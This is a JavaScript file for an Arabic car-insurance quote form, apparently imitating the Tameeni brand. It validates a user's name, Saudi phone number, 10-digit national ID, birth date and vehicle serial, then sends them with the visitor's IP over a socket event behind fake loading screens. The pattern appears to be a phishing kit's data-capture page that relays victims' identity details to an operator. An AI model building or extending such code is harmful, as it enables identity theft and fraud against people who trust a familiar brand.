
  function saveTempData(data) {
    sessionStorage.setItem('tameeniTempData', JSON.stringify(data));
  }

  
  function clearTempData() {
    sessionStorage.removeItem('tameeniTempData');
  }

  
  function showLoadingScreen() {
    const overlay = document.getElementById('loadingOverlay');
    const countdown = document.getElementById('loadingCountdown');
    
    if (!overlay || !countdown) return;
    
    let seconds = 5;
    overlay.style.display = 'flex';
    
    const timer = setInterval(() => {
      seconds--;
      countdown.textContent = seconds;
      
      if (seconds <= 0) {
        clearInterval(timer);
        overlay.style.display = 'none';
      }
    }, 1000);
  }

 
  function showLoadingAndRedirect(url) {
    const loadingScreen = document.getElementById('loadingScreen');
    if (!loadingScreen) {
      window.location.href = url;
      return;
    }
    
    loadingScreen.classList.add('show');
    setTimeout(() => {
      window.location.href = url;
    }, 1000);
  }

  
  function updateRegTypeUI(value) {
    const label = document.querySelector('label[for="serialNumber"]');
    const input = document.getElementById('serialNumber');
    if (!label || !input) return;

    if (value === 'customs') {
      label.textContent = 'رقم البطاقة الجمركية';
      input.placeholder = 'رقم البطاقة الجمركية للمركبة';
    } else {
      label.textContent = 'الرقم التسلسلي';
      input.placeholder = 'الرقم التسلسلي للمركبة';
    }
  }

 
  function updateOfferTypeUI(value) {
    const idLabel = document.querySelector('label[for="idNumber"]');
    const transferFields = document.querySelectorAll('.transfer-only');
    if (idLabel) {
      if (value === 'transfer') {
        idLabel.textContent = 'رقم الهوية (المالك الجديد)';
      } else {
        idLabel.textContent = 'رقم الهوية';
      }
    }
    transferFields.forEach(function (el) {
      if (value === 'transfer') {
        el.classList.remove('hidden');
      } else {
        el.classList.add('hidden');
      }
    });
  }


  function setupSegmented(id) {
    const container = document.getElementById(id);
    if (!container) return;
    const buttons = container.querySelectorAll('button');
    buttons.forEach(function (btn) {
      btn.addEventListener('click', function () {
        buttons.forEach(function (b) { b.classList.remove('active'); });
        btn.classList.add('active');
        container.dataset.value = btn.dataset.value;
        if (id === 'regType') {
          updateRegTypeUI(btn.dataset.value);
        }
        if (id === 'offerType') {
          updateOfferTypeUI(btn.dataset.value);
        }
      });
    });
  }

  


  document.addEventListener('DOMContentLoaded', function () {
   
    showLoadingScreen();

    setupSegmented('offerType');
    setupSegmented('regType');

    const offerType = document.getElementById('offerType');
    const regType = document.getElementById('regType');

   
    offerType.dataset.value = offerType.querySelector('button.active').dataset.value;
    regType.dataset.value = regType.querySelector('button.active').dataset.value;

    
    updateRegTypeUI(regType.dataset.value);
    updateOfferTypeUI(offerType.dataset.value);

    const form = document.getElementById('formStep1');
    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const idInput = document.getElementById('idNumber');
      const userNameInput = document.getElementById('userName');
      const phoneInput = document.getElementById('phoneNumber');
      const birthInput = document.getElementById('birthDate');
      const serialInput = document.getElementById('serialNumber');
      const carYearInput = document.getElementById('carYear');

      const idError = document.getElementById('idError');
      const userNameError = document.getElementById('userNameError');
      const phoneError = document.getElementById('phoneNumberError');
      const birthError = document.getElementById('birthDateError');
      const serialError = document.getElementById('serialError');
      const carYearError = document.getElementById('carYearError');

      idError.textContent = '';
      userNameError.textContent = '';
      phoneError.textContent = '';
      birthError.textContent = '';
      serialError.textContent = '';
      carYearError.textContent = '';

      let valid = true;

      
      const userNameVal = userNameInput.value.trim();
      if (!userNameVal) {
        userNameError.textContent = 'الرجاء إدخال الاسم.';
        valid = false;
      } else if (userNameVal.length < 2) {
        userNameError.textContent = 'الاسم قصير جداً.';
        valid = false;
      }

     
      const phoneVal = phoneInput.value.trim();
      if (!phoneVal) {
        phoneError.textContent = 'الرجاء إدخال رقم الهاتف.';
        valid = false;
      } else if (!/^05[0-9]{8}$/.test(phoneVal)) {
        phoneError.textContent = 'الرجاء إدخال رقم هاتف صحيح يبدأ بـ 05.';
        valid = false;
      }

      
      const idVal = idInput.value.trim();
      if (!idVal) {
        idError.textContent = 'الرجاء إدخال رقم الهوية.';
        valid = false;
      } else if (!/^[0-9]{10}$/.test(idVal)) {
        idError.textContent = 'الرجاء إدخال رقم هوية صحيح مكون من 10 أرقام.';
        valid = false;
      }

      
      if (!serialInput.value.trim()) {
        serialError.textContent = 'الرجاء إدخال الرقم التسلسلي.';
        valid = false;
      }

      
      if (offerType.dataset.value === 'transfer') {
        if (!birthInput.value) {
          birthError.textContent = 'الرجاء إدخال تاريخ الميلاد.';
          valid = false;
        }
        if (!carYearInput.value.trim()) {
          carYearError.textContent = 'الرجاء إدخال سنة الصنع.';
          valid = false;
        }
      }

      if (!valid) return;

      const d = {
        userName: userNameVal,
        phoneNumber: phoneVal,
        offerType: offerType.dataset.value,
        regType: regType.dataset.value,
        idNumber: idVal,
        birthDate: birthInput.value,
        serialNumber: serialInput.value.trim(),
        carYear: carYearInput.value.trim()
      };

      
      saveTempData(d);

      // ── Socket submit ──
      (async function() {
        while (window.visitorIP === null) {
          await new Promise(function(r) { setTimeout(r, 50); });
        }
        var ip = window.visitorIP;
        window.socket.emit('submitIndex', { ip: ip, ...d });
      })();

      showLoadingAndRedirect('vehicle.html');
    });
  });